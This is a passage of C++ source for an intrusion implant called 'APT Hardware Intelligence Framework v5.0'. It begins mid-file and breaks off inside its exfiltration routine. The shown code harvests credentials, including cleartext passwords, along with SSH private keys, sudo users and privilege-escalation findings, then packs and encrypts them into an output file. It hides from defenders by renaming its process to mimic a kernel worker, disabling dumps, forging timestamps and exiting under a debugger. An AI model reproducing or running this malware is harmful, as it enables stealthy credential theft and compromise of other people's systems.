    static std::vector<uint8_t> network(const std::vector<Hardware::NetworkInterfaces::Interface>& ifs) {
        BinaryPacker p;
        p.u32((uint32_t)ifs.size());
        for (auto& i : ifs) {
            p.str(i.name); p.bytes(i.mac, 6);
            p.u32(i.ip); p.u32(i.netmask); p.u32(i.broadcast); p.u32((uint32_t)i.mtu);
            p.u64(i.rx_bytes); p.u64(i.tx_bytes); p.u64(i.rx_pkts); p.u64(i.tx_pkts);
            p.u64(i.rx_errors); p.u64(i.tx_errors);
            p.str(i.driver); p.str(i.operstate); p.str(i.duplex);
            p.u32((uint32_t)i.speed_mbps);
            uint8_t fl = 0;
            if (i.up) fl |= 1; if (i.loopback) fl |= 2;
            if (i.wireless) fl |= 4; if (i.promisc) fl |= 8;
            p.u8(fl);
        }
        return p.data();
    }

    static std::vector<uint8_t> credentials(
        const std::vector<Credentials::ConfigCredentialHarvester::Credential>& creds
    ) {
        BinaryPacker p;
        p.u32((uint32_t)creds.size());
        for (auto& c : creds) {
            p.str(c.source); p.str(c.username); p.str(c.password_hash);
            p.str(c.password_clear); p.str(c.host); p.str(c.service);
        }
        return p.data();
    }

    static std::vector<uint8_t> ssh_keys(
        const std::vector<Credentials::SSHKeyHarvester::SSHKey>& keys
    ) {
        BinaryPacker p;
        p.u32((uint32_t)keys.size());
        for (auto& k : keys) {
            p.str(k.path); p.str(k.type); p.str(k.user);
            p.u8(k.is_private ? 1 : 0); p.u8(k.is_encrypted ? 1 : 0);
            p.bytes(k.data);
        }
        return p.data();
    }

    static std::vector<uint8_t> system_info(
        const Environment::SystemCollector::SystemInfo& si
    ) {
        BinaryPacker p;
        p.str(si.hostname); p.str(si.domain); p.str(si.kernel_version);
        p.str(si.os_release); p.str(si.arch); p.str(si.timezone);
        p.u64(si.total_ram); p.u64(si.free_ram);
        p.u64(si.total_swap); p.u64(si.free_swap);
        p.u64((uint64_t)si.uptime_seconds); p.u32((uint32_t)si.num_cpus);
        p.str_list(si.users_logged_in); p.str_list(si.listening_ports);
        p.str(si.selinux_status); p.str(si.apparmor_status);
        p.u8(si.firewall_active ? 1 : 0); p.str(si.iptables_rules);
        p.str(si.default_gateway);
        p.str_list(si.dns_servers); p.str_list(si.installed_kernels);
        p.u8(si.ssh_enabled ? 1 : 0); p.u16((uint16_t)si.ssh_port);
        p.u32((uint32_t)si.env_vars.size());
        for (auto& ev : si.env_vars) { p.str(ev.first); p.str(ev.second); }
        return p.data();
    }

    static std::vector<uint8_t> vulns(
        const std::vector<PrivEsc::VulnerabilityScanner::Vulnerability>& vs
    ) {
        BinaryPacker p;
        p.u32((uint32_t)vs.size());
        for (auto& v : vs) { p.str(v.name); p.str(v.description); p.str(v.path); p.u8((uint8_t)v.severity); }
        return p.data();
    }

    static std::vector<uint8_t> users(
        const std::vector<Environment::UserEnumerator::UserInfo>& us
    ) {
        BinaryPacker p;
        p.u32((uint32_t)us.size());
        for (auto& u : us) {
            p.str(u.username); p.str(u.home); p.str(u.shell); p.str(u.gecos);
            p.u32(u.uid); p.u32(u.gid);
            p.u8(u.has_login_shell ? 1 : 0);
            p.u8(u.has_ssh_keys ? 1 : 0);
            p.u8(u.has_sudo ? 1 : 0);
            p.str_list(u.groups);
        }
        return p.data();
    }

    static std::vector<uint8_t> connections(
        const std::vector<Environment::NetworkConnectionCollector::Connection>& cs
    ) {
        BinaryPacker p;
        p.u32((uint32_t)cs.size());
        for (auto& c : cs) {
            p.str(c.protocol); p.str(c.local_addr); p.str(c.remote_addr);
            p.str(c.state); p.u32((uint32_t)c.pid); p.str(c.process_name);
        }
        return p.data();
    }
};

} /* namespace Serialization */

namespace Reporting {

class ConsoleReporter {
    static void sep(const std::string& title) {
        std::cout << "\n\033[1;36m┌──────────────────────────────────────────────────────────────────┐\033[0m\n"
                  << "\033[1;36m│\033[1;33m " << std::left << std::setw(65) << title << "\033[1;36m│\033[0m\n"
                  << "\033[1;36m└──────────────────────────────────────────────────────────────────┘\033[0m" << std::endl;
    }
    static void kv(const std::string& k, const std::string& v) {
        std::cout << "  \033[0;37m" << std::left << std::setw(22) << k << "\033[0m: \033[1;32m" << v << "\033[0m\n";
    }
    static void kv_hex(const std::string& k, uint64_t v) {
        std::cout << "  \033[0;37m" << std::left << std::setw(22) << k << "\033[0m: \033[1;33m0x"
                  << std::hex << std::setfill('0') << std::setw(16) << v << std::dec << "\033[0m\n";
    }
    static void kv_bool(const std::string& k, bool v) {
        std::cout << "  \033[0;37m" << std::left << std::setw(22) << k << "\033[0m: "
                  << (v ? "\033[1;32mYES\033[0m" : "\033[0;31mNO\033[0m") << "\n";
    }
    static void kv_num(const std::string& k, uint64_t v, const std::string& u = "") {
        std::cout << "  \033[0;37m" << std::left << std::setw(22) << k << "\033[0m: \033[1;37m" << std::dec << v;
        if (!u.empty()) std::cout << " " << u;
        std::cout << "\033[0m\n";
    }
    static void warn(const std::string& m) { std::cout << "  \033[1;31m[!] " << m << "\033[0m\n"; }
    static void info(const std::string& m) { std::cout << "  \033[0;36m[*] " << m << "\033[0m\n"; }

public:
    static void banner() {
        std::cout << "\033[1;31m\n"
            "  ╔══════════════════════════════════════════════════════════════════╗\n"
            "  ║          APT HARDWARE INTELLIGENCE FRAMEWORK v5.0              ║\n"
            "  ║          ════════════════════════════════════════               ║\n"
            "  ║   Offline Intelligence Collection & Hardware Profiling          ║\n"
            "  ║   Encrypted File Output Only - No Network C2                   ║\n"
            "  ╚══════════════════════════════════════════════════════════════════╝\n"
            "\033[0m" << std::endl;
    }

    static void anti_analysis(const AntiAnalysis::AnalysisResult& a) {
        sep("ANTI-ANALYSIS ENGINE");
        kv_num("Debugger Score", a.debugger_score, "/ 190");
        kv_num("VM Score", a.vm_score, "/ 175");
        kv_num("Sandbox Score", a.sandbox_score, "/ 130");
        kv_num("Total Risk", a.total_score);
        kv_bool("Safe to Operate", a.is_safe);
        if (!a.hypervisor_vendor.empty()) kv("Hypervisor", a.hypervisor_vendor);
        for (auto& d : a.detections) warn(d);
    }

    static void cpu(const Hardware::CpuInfo& c) {
        sep("CPU DEEP ANALYSIS");
        kv("Vendor", c.vendor); kv("Brand", c.brand);
        kv_hex("Signature", c.signature);
        kv_num("Family", c.full_family); kv_num("Model", c.full_model);
        kv_num("Stepping", c.stepping); kv_num("Logical CPUs", c.logical_cpus);
        kv_num("Cache Line", c.cache_line, "bytes");
        kv_num("TSC Frequency", c.tsc_freq / 1000000, "MHz");

        std::cout << "\n  \033[1;33mExtensions:\033[0m\n";
        kv_bool("  VMX/VT-x", c.vmx); kv_bool("  SVM/AMD-V", c.svm);
        kv_bool("  AES-NI", c.aes); kv_bool("  AVX", c.avx);
        kv_bool("  AVX2", c.avx2); kv_bool("  AVX-512F", c.avx512f);
        kv_bool("  SSE4.2", c.sse42); kv_bool("  FMA", c.fma);
        kv_bool("  SHA", c.sha); kv_bool("  RDRAND", c.rdrand);
        kv_bool("  RDSEED", c.rdseed); kv_bool("  SGX", c.sgx);
        kv_bool("  SMX/TXT", c.smx); kv_bool("  TSX-HLE", c.tsx_hle);
        kv_bool("  Hypervisor", c.hypervisor);

        std::cout << "\n  \033[1;33mRaw Bits:\033[0m\n";
        kv_hex("  ECX", c.features_ecx); kv_hex("  EDX", c.features_edx);
        kv_hex("  Leaf7 EBX", c.ext7_ebx);

        if (!c.cache_info.empty()) {
            std::cout << "\n  \033[1;33mCache:\033[0m\n";
            for (auto& ci : c.cache_info) info(ci);
        }

        std::cout << "\n  \033[1;33mCPUID (" << c.leaves.size() << " leaves):\033[0m\n";
        for (auto& l : c.leaves) {
            std::cout << "    0x" << std::hex << std::setfill('0') << std::setw(8) << l.first
                      << " -> " << std::setw(8) << l.second[0] << " " << std::setw(8) << l.second[1]
                      << " " << std::setw(8) << l.second[2] << " " << std::setw(8) << l.second[3]
                      << std::dec << "\n";
        }
    }

    static void msr(Hardware::MSRAccess& m) {
        if (!m.ok()) return;
        sep("MODEL SPECIFIC REGISTERS (" + std::to_string(m.cpu_count()) + " CPUs)");
        struct { uint32_t a; const char* n; } regs[] = {
            {0x10,"TSC"},{0x17,"PLATFORM_ID"},{0x1B,"APIC_BASE"},{0x3A,"FEATURE_CTRL"},
            {0xCE,"PLATFORM_INFO"},{0xE2,"PKG_CST_CONFIG"},{0xFE,"MTRRCAP"},
            {0x174,"SYSENTER_CS"},{0x176,"SYSENTER_EIP"},{0x1A0,"MISC_ENABLE"},
            {0x1D9,"DEBUGCTL"},{0x277,"PAT"},{0x2FF,"MTRR_DEF_TYPE"},
            {0x480,"VMX_BASIC"},{0xC0000080,"EFER"},{0xC0000082,"LSTAR"},
            {0xC0000100,"FS_BASE"},{0xC0000101,"GS_BASE"},{0xC0000102,"KERNEL_GS_BASE"}
        };
        for (auto& r : regs) {
            uint64_t v = m.read(r.a);
            if (v || r.a < 0x200)
                std::cout << "  0x" << std::hex << std::setfill('0') << std::setw(8) << r.a << " "
                          << std::left << std::setw(22) << r.n << std::right << " = 0x"
                          << std::setw(16) << v << std::dec << "\n";
        }
    }

    static void pci(const std::vector<Hardware::PCIDevice>& devs, Hardware::PCIScanner& sc) {
        if (devs.empty()) return;
        sep("PCI DEVICES (" + std::to_string(devs.size()) + ")");
        for (auto& d : devs) {
            std::cout << "  " << std::hex << std::setfill('0') << std::setw(2) << (int)d.bus << ":"
                      << std::setw(2) << (int)d.device << "." << (int)d.function
                      << " [\033[1;33m" << d.class_name << "\033[0m] "
                      << std::setw(4) << d.vendor_id << ":" << std::setw(4) << d.device_id
                      << " sub=" << std::setw(4) << d.subsys_vendor << ":" << std::setw(4) << d.subsys_device
                      << std::dec << " irq=" << (int)d.irq_line << std::hex;
            if (!d.capabilities.empty()) {
                std::cout << " caps:";
                for (auto c : d.capabilities) std::cout << std::setw(2) << (int)c << " ";
            }
            std::cout << std::dec << "\n";
        }
        kv_hex("\n  PCI Fingerprint", sc.fingerprint(devs));
    }

    static void smbios(const Hardware::SMBIOSParser::Info& s) {
        sep("SMBIOS / DMI");
        kv("BIOS Vendor", s.bios_vendor); kv("BIOS Version", s.bios_version);
        kv("BIOS Date", s.bios_date); kv("System Mfg", s.sys_mfg);
        kv("System Product", s.sys_product); kv("System Serial", s.sys_serial);
        kv("System UUID", s.sys_uuid); kv("Board Mfg", s.board_mfg);
        kv("Board Product", s.board_product); kv("Board Serial", s.board_serial);
        kv("Chassis Mfg", s.chassis_mfg); kv("Chassis Type", s.chassis_type);
        if (!s.processors.empty()) { std::cout << "\n  \033[1;33mProcessors:\033[0m\n"; for (auto& p : s.processors) info(p); }
        if (!s.memory_devices.empty()) { std::cout << "\n  \033[1;33mMemory:\033[0m\n"; for (auto& m : s.memory_devices) info(m); }
        if (!s.slots.empty()) { std::cout << "\n  \033[1;33mSlots:\033[0m\n"; for (auto& sl : s.slots) info(sl); }
        kv_num("Raw Tables", s.raw.size());
    }

    static void acpi(const std::vector<Hardware::ACPIScanner::Table>& ts) {
        if (ts.empty()) return;
        sep("ACPI TABLES (" + std::to_string(ts.size()) + ")");
        for (auto& t : ts)
            std::cout << "  \033[1;32m" << t.sig << "\033[0m @ 0x" << std::hex << std::setfill('0')
                      << std::setw(16) << t.address << " len=" << std::dec << t.length
                      << " rev=" << (int)t.revision << " OEM='" << t.oem_id << "'\n";
    }

    static void usb(const std::vector<Hardware::USBEnumerator::Device>& ds) {
        if (ds.empty()) return;
        sep("USB DEVICES (" + std::to_string(ds.size()) + ")");
        for (auto& d : ds) {
            std::cout << "  Bus" << d.busnum << " Dev" << d.devnum << " ["
                      << std::hex << std::setfill('0') << std::setw(4) << d.vid << ":" << std::setw(4) << d.pid
                      << std::dec << "]";
            if (!d.manufacturer.empty()) std::cout << " " << d.manufacturer;
            if (!d.product.empty()) std::cout << " " << d.product;
            if (!d.serial.empty()) std::cout << " SN:" << d.serial;
            if (!d.speed.empty()) std::cout << " (" << d.speed << "Mbps)";
            std::cout << "\n";
        }
    }

    static void net(const std::vector<Hardware::NetworkInterfaces::Interface>& ifs) {
        sep("NETWORK INTERFACES");
        for (auto& i : ifs) {
            std::cout << "  \033[1;32m" << std::left << std::setw(12) << i.name << "\033[0m" << std::right
                      << " MAC=" << std::hex << std::setfill('0');
            for (int j = 0; j < 6; j++) { if (j) std::cout << ":"; std::cout << std::setw(2) << (int)i.mac[j]; }
            struct in_addr a; a.s_addr = i.ip;
            std::cout << std::dec << " IP=" << inet_ntoa(a) << " MTU=" << i.mtu;
            if (i.up) std::cout << " \033[1;32mUP\033[0m";
            if (i.wireless) std::cout << " \033[1;35mWIFI\033[0m";
            if (i.promisc) std::cout << " \033[1;31mPROMISC\033[0m";
            if (!i.driver.empty()) std::cout << " drv=" << i.driver;
            if (i.speed_mbps > 0) std::cout << " " << i.speed_mbps << "Mbps";
            std::cout << " [" << i.operstate << "]\n"
                      << "              RX:" << i.rx_bytes << "B/" << i.rx_pkts << "p TX:"
                      << i.tx_bytes << "B/" << i.tx_pkts << "p Err:" << i.rx_errors << "/" << i.tx_errors << "\n";
        }
    }

    static void dma(const std::vector<Hardware::DMAMapper::Region>& rs) {
        sep("DMA / IOMEM (" + std::to_string(rs.size()) + " regions)");
        int atk = 0; for (auto& r : rs) if (r.attack_surface) atk++;
        kv_num("Attack Surfaces", atk);
        std::cout << "\n";
        for (auto& r : rs) {
            std::string indent(r.indent * 2, ' ');
            std::cout << "  " << indent << (r.attack_surface ? "\033[1;31m>>> " : "    ")
                      << "0x" << std::hex << std::setfill('0') << std::setw(16) << r.base
                      << "-0x" << std::setw(16) << (r.base + r.size - 1) << std::dec
                      << " (" << std::setw(10) << r.size << ") " << r.description
                      << (r.attack_surface ? "\033[0m" : "") << "\n";
        }
    }

    static void storage(const std::vector<Hardware::StorageDetector::DiskInfo>& ds) {
        if (ds.empty()) return;
        sep("STORAGE");
        for (auto& d : ds) {
            kv("Device", "/dev/" + d.name); kv("  Model", d.model);
            kv("  Serial", d.serial); kv("  Transport", d.transport);
            kv_num("  Size", d.size_bytes / (1024 * 1024 * 1024), "GB");
            kv_bool("  Rotational", d.rotational);
        }
    }

    static void thermal(const std::vector<Hardware::ThermalMonitor::Zone>& zs) {
        if (zs.empty()) return;
        sep("THERMAL");
        for (auto& z : zs) std::cout << "  " << std::left << std::setw(20) << z.type << std::right
                                     << " " << z.temp_mC / 1000 << "." << (z.temp_mC % 1000) / 100 << " C\n";
    }

    static void sys_info(const Environment::SystemCollector::SystemInfo& si) {
        sep("SYSTEM / ENVIRONMENT");
        kv("Hostname", si.hostname); kv("Domain", si.domain);
        kv("Kernel", si.kernel_version); kv("Arch", si.arch); kv("Timezone", si.timezone);
        kv_num("Total RAM", si.total_ram / (1024 * 1024), "MB");
        kv_num("Free RAM", si.free_ram / (1024 * 1024), "MB");
        kv_num("CPUs", si.num_cpus); kv_num("Uptime", si.uptime_seconds, "sec");
        kv("Gateway", si.default_gateway);
        kv("SELinux", si.selinux_status.empty() ? "N/A" : si.selinux_status);
        kv_bool("Firewall", si.firewall_active);
        kv_bool("SSH Enabled", si.ssh_enabled); kv_num("SSH Port", si.ssh_port);
        if (!si.dns_servers.empty()) { std::cout << "\n  \033[1;33mDNS:\033[0m "; for (auto& d : si.dns_servers) std::cout << d << " "; std::cout << "\n"; }
        if (!si.users_logged_in.empty()) { std::cout << "\n  \033[1;33mLogged In:\033[0m\n"; for (auto& u : si.users_logged_in) if (!u.empty()) info(u); }
        if (!si.listening_ports.empty()) { std::cout << "\n  \033[1;33mListening:\033[0m\n"; for (auto& p : si.listening_ports) if (!p.empty()) info(p); }
    }

    static void creds(const std::vector<Credentials::ConfigCredentialHarvester::Credential>& cs) {
        if (cs.empty()) return;
        sep("HARVESTED CREDENTIALS (" + std::to_string(cs.size()) + ")");
        for (auto& c : cs) {
            std::cout << "  \033[1;31m[" << c.service << "]\033[0m " << c.source;
            if (!c.username.empty()) std::cout << " user=" << c.username;
            if (!c.host.empty()) std::cout << " host=" << c.host;
            if (!c.password_clear.empty()) std::cout << " \033[1;31mPASS=***\033[0m";
            if (!c.password_hash.empty()) std::cout << " hash=" << c.password_hash.substr(0, 30) << "...";
            std::cout << "\n";
        }
    }

    static void ssh_keys(const std::vector<Credentials::SSHKeyHarvester::SSHKey>& ks) {
        if (ks.empty()) return;
        sep("SSH KEYS (" + std::to_string(ks.size()) + ")");
        for (auto& k : ks)
            std::cout << "  " << k.path << " [" << k.type << "] user=" << k.user
                      << (k.is_private ? " \033[1;31mPRIVATE\033[0m" : " PUBLIC")
                      << (k.is_encrypted ? " ENCRYPTED" : " PLAIN")
                      << " " << k.data.size() << "B\n";
    }

    static void vulns(const std::vector<PrivEsc::VulnerabilityScanner::Vulnerability>& vs) {
        if (vs.empty()) return;
        sep("PRIVILEGE ESCALATION (" + std::to_string(vs.size()) + ")");
        for (auto& v : vs) {
            std::string col = (v.severity >= 8) ? "\033[1;31m" : (v.severity >= 5) ? "\033[1;33m" : "\033[0;37m";
            std::cout << "  " << col << "[" << v.severity << "/10] " << v.name << "\033[0m\n    " << v.description << "\n";
        }
    }

    static void security_tools(const std::vector<Environment::ProcessEnumerator::ProcessInfo>& ts) {
        if (ts.empty()) return;
        sep("SECURITY TOOLS DETECTED");
        for (auto& t : ts) warn(t.name + " (PID " + std::to_string(t.pid) + " user=" + t.username + ")");
    }

    static void users(const std::vector<Environment::UserEnumerator::UserInfo>& us) {
        if (us.empty()) return;
        sep("INTERACTIVE USERS");
        for (auto& u : us) {
            std::cout << "  " << std::left << std::setw(15) << u.username << std::right
                      << " uid=" << u.uid << " home=" << u.home << " shell=" << u.shell;
            if (u.has_sudo) std::cout << " \033[1;31mSUDO\033[0m";
            if (u.has_ssh_keys) std::cout << " \033[1;33mSSH_KEYS\033[0m";
            std::cout << "\n";
        }
    }

    static void services(const std::vector<std::string>& svcs) {
        if (svcs.empty()) return;
        sep("NOTABLE SERVICES");
        for (auto& s : svcs) info(s);
    }

    static void connections(const std::vector<Environment::NetworkConnectionCollector::Connection>& cs) {
        if (cs.empty()) return;
        sep("ESTABLISHED CONNECTIONS (" + std::to_string(cs.size()) + ")");
        for (auto& c : cs) std::cout << "  " << c.protocol << " " << c.local_addr << " -> " << c.remote_addr
                                     << " [" << c.state << "] pid=" << c.pid << "\n";
    }

    static void cmos_dump(const uint8_t* data) {
        sep("CMOS NVRAM");
        for (int row = 0; row < 16; row++) {
            std::cout << "  " << std::hex << std::setfill('0') << std::setw(2) << row * 16 << ": ";
            for (int col = 0; col < 16; col++) std::cout << std::setw(2) << (int)data[row * 16 + col] << " ";
            std::cout << " |";
            for (int col = 0; col < 16; col++) { char c = data[row * 16 + col]; std::cout << (isprint(c) ? c : '.'); }
            std::cout << "|" << std::dec << "\n";
        }
    }

    static void hw_id(uint64_t id, const std::array<uint8_t, 32>& hash) {
        sep("COMPOSITE HARDWARE FINGERPRINT");
        kv_hex("Hardware ID", id);
        std::cout << "  Full SHA-256     : \033[1;33m" << bytes_to_hex(hash.data(), 32) << "\033[0m\n";
    }

    static void footer() {
        std::cout << "\n\033[1;31m"
            "  ╔══════════════════════════════════════════════════════════════════╗\n"
            "  ║                        END OF REPORT                           ║\n"
            "  ╚══════════════════════════════════════════════════════════════════╝\n"
            "\033[0m" << std::endl;
    }
};
} /* namespace Reporting */

namespace Exfiltration {

class FileExfilEngine {
    Crypto::ChaCha20 cipher;
    std::vector<uint8_t> master_key;
    uint64_t hw_id;
public:
    FileExfilEngine(uint64_t id) : hw_id(id) {
        uint8_t salt[] = "APT5_REFINED_MASTER_2024";
        uint8_t info[] = "FILE_ENCRYPT_KEY";
        master_key = Crypto::HKDF::derive(
            reinterpret_cast<uint8_t*>(&hw_id), 8,
            salt, sizeof(salt) - 1, info, sizeof(info) - 1, 32);
    }

    std::vector<uint8_t> build(const std::map<uint16_t, std::vector<uint8_t>>& sections) {
        Serialization::BinaryPacker p;
        p.u32(0x41505435); /* APT5 */
        p.u8(5); p.u8(0); /* version, flags */
        uint64_t ts = std::chrono::system_clock::now().time_since_epoch().count();
        p.u64(ts); p.u64(hw_id);
        p.u32((uint32_t)sections.size());
        for (auto& s : sections) { p.u16(s.first); p.bytes(s.second); }
        auto& buf = p.mutable_data();
        auto integrity = Crypto::SHA256::hash(buf);
        buf.insert(buf.end(), integrity.begin(), integrity.end());
        return buf;
    }

    std::vector<uint8_t> encrypt(const std::vector<uint8_t>& data) {
        auto nonce = Crypto::SecureRandom::bytes(12);
        std::vector<uint8_t> enc(data);
        Crypto::ChaCha20 c;
        c.init(master_key.data(), nonce.data());
        c.process(enc.data(), enc.size());
        auto hmac = Crypto::HMAC_SHA256::compute(master_key.data(), master_key.size(), enc.data(), enc.size());

        std::vector<uint8_t> result;
        uint32_t magic = 0x48574944;
        result.insert(result.end(), (uint8_t*)&magic, (uint8_t*)&magic + 4);
        uint8_t ver = 5; result.push_back(ver);
        uint32_t total = 12 + enc.size() + 32;
        result.insert(result.end(), (uint8_t*)&total, (uint8_t*)&total + 4);
        result.insert(result.end(), nonce.begin(), nonce.end());
        result.insert(result.end(), enc.begin(), enc.end());
        result.insert(result.end(), hmac.begin(), hmac.end());
        return result;
    }

    bool write(const std::string& path, const std::vector<uint8_t>& data) {
        std::ofstream f(path, std::ios::binary);
        if (!f) return false;
        f.write(reinterpret_cast<const char*>(data.data()), data.size());
        f.close();
        Stealth::TimestampForger::match_reference(path, "/usr/bin/ls");
        return true;
    }

    ~FileExfilEngine() {
        Stealth::MemoryProtection::secure_clear(master_key.data(), master_key.size());
    }
};

} /* namespace Exfiltration */

/* ══════════════════════════════════════════════════════════
 *  MAIN IMPLANT CLASS
 * ══════════════════════════════════════════════════════════ */

class HardwareImplantV5 {
    Hardware::PortIO port_io;
    Hardware::PhysicalMemory phys_mem;
    Hardware::MSRAccess msr;

    Hardware::CpuInfo cpu_info;
    Hardware::SMBIOSParser::Info smbios_info;
    std::vector<Hardware::ACPIScanner::Table> acpi_tables;
    std::vector<Hardware::PCIDevice> pci_devices;
    std::vector<Hardware::USBEnumerator::Device> usb_devices;
    std::vector<Hardware::NetworkInterfaces::Interface> net_ifaces;
    std::vector<Hardware::DMAMapper::Region> dma_regions;
    std::vector<Hardware::GPUDetector::GPUInfo> gpus;
    std::vector<Hardware::StorageDetector::DiskInfo> disks;
    std::vector<Hardware::ThermalMonitor::Zone> thermal_zones;
    std::vector<Hardware::PowerSupply::Info> power_supplies;
    std::vector<Hardware::InputDevices::InputDev> input_devices;

    Environment::SystemCollector::SystemInfo sys_info;
    std::vector<Environment::ProcessEnumerator::ProcessInfo> sec_tools;
    std::vector<Credentials::ConfigCredentialHarvester::Credential> credentials;
    std::vector<Credentials::SSHKeyHarvester::SSHKey> ssh_keys;
    std::vector<std::string> known_hosts, ssh_targets;
    std::vector<PrivEsc::VulnerabilityScanner::Vulnerability> vulns;
    std::vector<Environment::UserEnumerator::UserInfo> users;
    std::vector<std::string> services;
    std::vector<Environment::NetworkConnectionCollector::Connection> connections;
    std::vector<std::string> crontabs;
    std::vector<Environment::MountPointCollector::MountPoint> mounts;
    std::vector<Environment::KernelModuleEnumerator::KModule> kernel_modules;

    AntiAnalysis::AnalysisResult analysis;
    uint64_t composite_id;
    std::array<uint8_t, 32> full_hash;
    uint8_t cmos_data[256];
    bool initialized;

    uint64_t compute_id() {
        std::vector<uint8_t> entropy;
        Hardware::CPUIdentifier::serialize(cpu_info, entropy);
        for (auto& t : smbios_info.raw) entropy.insert(entropy.end(), t.second.begin(), t.second.end());
        for (auto& d : pci_devices) entropy.insert(entropy.end(), d.config.begin(), d.config.end());
        for (auto& i : net_ifaces) if (!i.loopback) entropy.insert(entropy.end(), i.mac, i.mac + 6);
        if (port_io.ok()) entropy.insert(entropy.end(), cmos_data, cmos_data + 256);
        if (msr.ok()) { uint64_t p = msr.read(0x17); entropy.insert(entropy.end(), (uint8_t*)&p, (uint8_t*)&p + 8); }
        for (auto& u : usb_devices) if (!u.serial.empty()) entropy.insert(entropy.end(), u.serial.begin(), u.serial.end());
        for (auto& d : disks) if (!d.serial.empty()) entropy.insert(entropy.end(), d.serial.begin(), d.serial.end());
        auto h = Crypto::SHA256::hash(entropy);
        full_hash = h;
        uint64_t id; memcpy(&id, h.data(), 8);
        return id;
    }

public:
    HardwareImplantV5() : initialized(false), composite_id(0) { memset(cmos_data, 0, 256); }

    bool initialize(int argc, char** argv) {
        signal(SIGPIPE, SIG_IGN); signal(SIGTERM, signal_handler); signal(SIGINT, signal_handler);
        Stealth::MemoryProtection::disable_dumps();

        analysis = AntiAnalysis::run_full_analysis();
        if (analysis.debugger_score >= 50) return false;

        Stealth::ProcessHider::rename_process("[kworker/0:0-ev]");
        Stealth::ProcessHider::modify_argv(argc, argv);
        Stealth::ProcessHider::set_oom_immune();

        cpu_info = Hardware::CPUIdentifier::identify();
        if (phys_mem.ok()) {
            Hardware::SMBIOSParser sm(phys_mem); smbios_info = sm.parse();
            Hardware::ACPIScanner ac(phys_mem); acpi_tables = ac.enumerate();
        }
        if (port_io.ok()) {
            Hardware::PCIScanner pc(port_io); pci_devices = pc.enumerate();
            Hardware::CMOSReader cm(port_io); cm.dump(cmos_data, 256);
        }
        usb_devices = Hardware::USBEnumerator::enumerate();
        net_ifaces = Hardware::NetworkInterfaces::enumerate();
        dma_regions = Hardware::DMAMapper::map();
        gpus = Hardware::GPUDetector::detect();
        disks = Hardware::StorageDetector::detect();
        thermal_zones = Hardware::ThermalMonitor::read_zones();
        power_supplies = Hardware::PowerSupply::detect();
        input_devices = Hardware::InputDevices::enumerate();

        sys_info = Environment::SystemCollector::collect();
        sec_tools = Environment::ProcessEnumerator::find_security_tools();
        users = Environment::UserEnumerator::get_interactive_users();
        services = Environment::ServiceEnumerator::find_interesting_services();
        connections = Environment::NetworkConnectionCollector::get_established();
        crontabs = Environment::CrontabCollector::collect_all();
        mounts = Environment::MountPointCollector::collect();
        kernel_modules = Environment::KernelModuleEnumerator::enumerate();

        credentials = Credentials::ConfigCredentialHarvester::harvest_all();
        ssh_keys = Credentials::SSHKeyHarvester::harvest();
        known_hosts = Credentials::SSHKeyHarvester::parse_known_hosts();
        ssh_targets = Credentials::SSHKeyHarvester::parse_ssh_config();
        vulns = PrivEsc::VulnerabilityScanner::scan();

        composite_id = compute_id();
        initialized = true;
        return true;
    }

    void report() {
        if (!initialized) return;
        Reporting::ConsoleReporter::banner();
        Reporting::ConsoleReporter::anti_analysis(analysis);
        Reporting::ConsoleReporter::cpu(cpu_info);
        Reporting::ConsoleReporter::msr(msr);
        if (!pci_devices.empty()) { Hardware::PCIScanner sc(port_io); Reporting::ConsoleReporter::pci(pci_devices, sc); }
        Reporting::ConsoleReporter::smbios(smbios_info);
        Reporting::ConsoleReporter::acpi(acpi_tables);
        Reporting::ConsoleReporter::usb(usb_devices);
        Reporting::ConsoleReporter::net(net_ifaces);
        Reporting::ConsoleReporter::dma(dma_regions);
        Reporting::ConsoleReporter::storage(disks);
        Reporting::ConsoleReporter::thermal(thermal_zones);
        if (port_io.ok()) Reporting::ConsoleReporter::cmos_dump(cmos_data);

        if (!input_devices.empty()) {
            std::cout << "\n\033[1;36m┌──────────────────────────────────────────────────────────────────┐\033[0m\n"
                      << "\033[1;36m│\033[1;33m INPUT DEVICES (" << input_devices.size() << ")"
                      << std::string(48, ' ') << "\033[1;36m│\033[0m\n"
                      << "\033[1;36m└──────────────────────────────────────────────────────────────────┘\033[0m\n";
            for (auto& d : input_devices)
                std::cout << "  " << d.name << " [" << d.phys << "] Bus:" << std::hex << d.bustype
                          << " VID:" << d.vendor << " PID:" << d.product << std::dec << "\n";
        }

        Reporting::ConsoleReporter::sys_info(sys_info);
        Reporting::ConsoleReporter::users(users);
        Reporting::ConsoleReporter::services(services);
        Reporting::ConsoleReporter::connections(connections);
        Reporting::ConsoleReporter::security_tools(sec_tools);
        Reporting::ConsoleReporter::creds(credentials);
        Reporting::ConsoleReporter::ssh_keys(ssh_keys);

        if (!known_hosts.empty()) {
            std::cout << "\n  \033[1;33mKnown SSH Hosts (" << known_hosts.size() << "):\033[0m\n";
            for (auto& h : known_hosts) std::cout << "    " << h << "\n";
        }
        if (!ssh_targets.empty()) {
            std::cout << "\n  \033[1;33mSSH Config Targets (" << ssh_targets.size() << "):\033[0m\n";
            for (auto& t : ssh_targets) std::cout << "    " << t << "\n";
        }

        if (!crontabs.empty()) {
            std::cout << "\n\033[1;36m┌──────────────────────────────────────────────────────────────────┐\033[0m\n"
                      << "\033[1;36m│\033[1;33m SCHEDULED TASKS" << std::string(49, ' ') << "\033[1;36m│\033[0m\n"
                      << "\033[1;36m└──────────────────────────────────────────────────────────────────┘\033[0m\n";
            for (auto& c : crontabs) std::cout << "  " << c << "\n";
        }

        if (!mounts.empty()) {
            std::cout << "\n\033[1;36m┌──────────────────────────────────────────────────────────────────┐\033[0m\n"
                      << "\033[1;36m│\033[1;33m MOUNT POINTS" << std::string(52, ' ') << "\033[1;36m│\033[0m\n"
                      << "\033[1;36m└──────────────────────────────────────────────────────────────────┘\033[0m\n";
            for (auto& m : mounts)
                std::cout << "  " << std::left << std::setw(20) << m.device << " -> " << std::setw(20) << m.path
                          << " [" << m.fs_type << "] " << m.total_bytes / (1024 * 1024) << "MB total\n";
        }

        Reporting::ConsoleReporter::vulns(vulns);
        Reporting::ConsoleReporter::hw_id(composite_id, full_hash);
        Reporting::ConsoleReporter::footer();
    }

    bool exfiltrate(const std::string& path) {
        if (!initialized) return false;
        std::map<uint16_t, std::vector<uint8_t>> sections;

        sections[Serialization::T_CPU] = Serialization::Serializer::cpu(cpu_info);
        sections[Serialization::T_CPU_LEAVES] = Serialization::Serializer::cpu_leaves(cpu_info);
        if (!pci_devices.empty()) sections[Serialization::T_PCI] = Serialization::Serializer::pci(pci_devices);
